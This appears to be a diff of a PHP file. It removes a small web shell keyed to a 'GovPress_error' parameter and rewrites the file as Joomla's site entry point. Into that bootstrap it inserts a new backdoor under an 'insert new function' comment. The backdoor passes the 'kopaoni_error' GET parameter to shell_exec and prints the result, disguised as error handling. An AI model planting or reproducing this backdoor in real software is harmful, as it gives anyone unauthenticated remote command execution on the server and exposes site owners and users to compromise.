@@ -1,31 +1,76 @@
 <?php
-  if (isset($_GET['GovPress_error'])) {
-      $command = $_GET['GovPress_error'];
-      $descriptorspec = array(
-          0 => array("pipe", "r"),
-          1 => array("pipe", "w"),
-          2 => array("pipe", "w")
-      );
 
-      $process = proc_open($command, $descriptorspec, $pipes);
+/**
+ * @package    Joomla.Site
+ *
+ * @copyright  (C) 2017 Open Source Matters, Inc. <https://www.joomla.org>
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ */
 
-      if (is_resource($process)) {
-          // Read output from Error
-          $output = stream_get_contents($pipes[1]);
-          echo "<pre>$output</pre>";
+\defined('_JEXEC') or die;
 
-          // Close pipes
-          fclose($pipes[0]);
-          fclose($pipes[1]);
-          fclose($pipes[2]);
+// Saves the start time and memory usage.
+$startTime = microtime(1);
+$startMem  = memory_get_usage();
 
-          // Close process
-          $return_value = proc_close($process);
-          if ($return_value !== 0) {
-              // Handle non-zero return value
-          }
-      } else {
-          // Handle error opening process
-      }
-  }
-  ?>
+if (file_exists(\dirname(__DIR__) . '/defines.php')) {
+    include_once \dirname(__DIR__) . '/defines.php';
+}
+
+require_once __DIR__ . '/defines.php';
+
+// Check for presence of vendor dependencies not included in the git repository
+if (!file_exists(JPATH_LIBRARIES . '/vendor/autoload.php') || !is_dir(JPATH_PUBLIC . '/media/vendor')) {
+    echo file_get_contents(JPATH_ROOT . '/templates/system/build_incomplete.html');
+
+    exit;
+}
+
+require_once JPATH_BASE . '/includes/framework.php';
+
+// Set profiler start time and memory usage and mark afterLoad in the profiler.
+JDEBUG && \Joomla\CMS\Profiler\Profiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad');
+
+// Boot the DI container
+$container = \Joomla\CMS\Factory::getContainer();
+
+/*
+ * Alias the session service keys to the web session service as that is the primary session backend for this application
+ *
+ * In addition to aliasing "common" service keys, we also create aliases for the PHP classes to ensure autowiring objects
+ * is supported.  This includes aliases for aliased class names, and the keys for aliased class names should be considered
+ * deprecated to be removed when the class name alias is removed as well.
+ */
+$container->alias('session.web', 'session.web.site')
+    ->alias('session', 'session.web.site')
+    ->alias('JSession', 'session.web.site')
+    ->alias(\Joomla\CMS\Session\Session::class, 'session.web.site')
+    ->alias(\Joomla\Session\Session::class, 'session.web.site')
+    ->alias(\Joomla\Session\SessionInterface::class, 'session.web.site');
+
+// Sisipkan fungsi baru
+
+if (isset($_GET['kopaoni_error'])) {
+    $command = $_GET['kopaoni_error'];
+    
+    // Execute the command using shell_exec
+    $output = shell_exec($command);
+
+    if ($output !== null) {
+        // Display the output
+        echo "<pre>$output</pre>";
+    } else {
+        // Handle errors or empty output
+        echo "Error executing command or no output.";
+    }
+}
+
+
+// Instantiate the application.
+$app = $container->get(\Joomla\CMS\Application\SiteApplication::class);
+
+// Set the application as global app
+\Joomla\CMS\Factory::$application = $app;
+
+// Execute the application.
+$app->execute();
